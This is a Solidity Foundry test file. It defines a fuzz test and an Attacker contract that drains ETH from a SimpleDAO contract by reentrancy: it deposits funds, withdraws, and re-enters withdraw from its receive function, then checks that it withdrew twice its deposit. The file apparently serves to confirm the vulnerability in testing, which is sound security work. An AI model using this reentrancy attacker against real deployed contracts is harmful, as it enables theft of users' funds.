
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SimpleDAO} from "../src/SimpleDAO.sol";

contract TestReentrancySimpleDAO is Test {
    SimpleDAO public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new SimpleDAO();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0.1 ether && attackVal < 100 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state required beyond funding and setup.

        // --- 3. Funding ---
        // A. Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // B. Fund the Attacker (redundancy)
        vm.deal(address(_attacker), attackVal);

        // C. CRITICAL: Fund the Test Contract (address(this))
        vm.deal(address(this), attackVal);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    SimpleDAO public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public storedVal;

    constructor(address victimAddress) { 
        victim = SimpleDAO(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedVal = val;
        
        // Deposit funds to establish credit for the initial withdrawal
        victim.donate{value: val}(address(this));
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        uint256 startBalance = address(this).balance;

        // 3. Call the vulnerable function.
        victim.withdraw(val);

        // 4. Verify Success Conditions.
        // If the attack succeeded, we withdrew 'val' twice (once initially, once via reentrancy).
        // Therefore, our balance should have increased by at least 2 * val.
        if (address(this).balance >= startBalance + (2 * val)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {            
            attackCallCount++;
            // Re-enter the contract using the stored Fuzz/Symbolic value.
            victim.withdraw(storedVal);
        }
    }

    fallback() external payable {}
}
